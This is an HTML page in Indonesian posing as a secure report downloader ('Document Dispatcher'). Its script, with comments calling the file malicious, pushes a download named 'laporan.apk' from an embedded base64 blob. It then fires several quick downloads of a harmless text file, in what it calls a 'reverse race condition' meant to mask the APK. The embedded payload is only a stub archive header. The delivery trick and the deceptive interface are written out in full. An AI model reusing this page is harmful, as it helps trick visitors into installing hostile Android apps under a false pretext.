<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document Archive</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: monospace; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
  .panel { background: #111827; padding: 30px; border-radius: 12px; border: 1px solid #1f2937; max-width: 400px; width: 100%; }
  h2 { color: #3b82f6; margin-bottom: 10px; }
  p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px; background: #3b82f6; color: #fff; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
  button:hover { background: #2563eb; }
  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #38bdf8; font-size: 13px; }
</style>
</head>
<body>

<div class="panel">
  <h2>📄 Document Dispatcher</h2>
  <p>Mengunduh laporan secara aman...</p>
  <button id="startBtn">Download Laporan</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PERSIAPAN PAYLOAD
  // ============================================
  
  // A. File Jahat (APK)
  var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  var binary = atob(b64Apk);
  var bytes = new Uint8Array(binary.length);
  for (var i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  var maliciousUrl = URL.createObjectURL(maliciousBlob);

  // B. File Aman (TXT)
  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
  var safeUrl = URL.createObjectURL(safeBlob);

  // ============================================
  // 2. REVERSE RACE CONDITION (APK FIRST)
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    statusEl.innerText = "Memulai Reverse Race Condition...";

    var a = document.createElement('a');
    a.style.display = 'none';
    document.body.appendChild(a);

    // LANGKAH 1: Set ke APK (Jahat)
    a.href = maliciousUrl;
    a.download = 'laporan.apk';
    
    // Picu Unduhan APK
    a.click();
    statusEl.innerText = "Mengirim APK...";

    // LANGKAH 2: RACE CONDITION
    // Timpa dengan TXT secepat mungkin.
    // Tujuannya: Browser mungkin sudah mulai menulis APK ke disk,
    // lalu kita paksa antrean berubah ke TXT.
    
    var attempts = 0;
    function raceToTXT() {
      attempts++;
      
      // Ganti ke file TXT
      a.href = safeUrl;
      a.download = 'laporan.txt';
      
      // Trigger ulang
      a.click();

      if (attempts < 5) {
        setTimeout(raceToTXT, 0); // 0ms
      } else {
        // Cleanup
        setTimeout(function() {
          document.body.removeChild(a);
          URL.revokeObjectURL(safeUrl);
          URL.revokeObjectURL(maliciousUrl);
          statusEl.innerText = "Selesai. Cek folder Downloads.";
        }, 5000);
      }
    }

    // Mulai race
    setTimeout(raceToTXT, 0);

  });

})();
</script>
</body>
</html>
